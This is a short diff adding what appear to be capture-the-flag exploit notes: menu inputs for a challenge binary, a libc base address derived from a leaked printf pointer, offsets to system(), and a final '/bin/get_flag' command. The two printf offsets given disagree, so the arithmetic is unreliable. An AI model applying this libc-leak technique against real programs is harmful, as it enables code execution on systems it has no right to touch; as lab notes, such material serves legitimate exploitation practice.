@@ -1,0 +1,13 @@
+0\n1073741828\n0\n4\n1\n1\n8\n9\n4208392\n2\n1\n6\n7\n
+
+get libc addr from PRINTF: [[0xf7e0d450]] − 0x52450 = 0xF7DBB000 = 4158369792
+
+OUT - PRINTF_ADDR = OUT - 0x53cf0 = RESULT
+
+RESULT + OFFSET_SYSTEM = RES + 0x45e50
+
+1\n18\n19\n
+
+/bin/get_flag\n
+
+
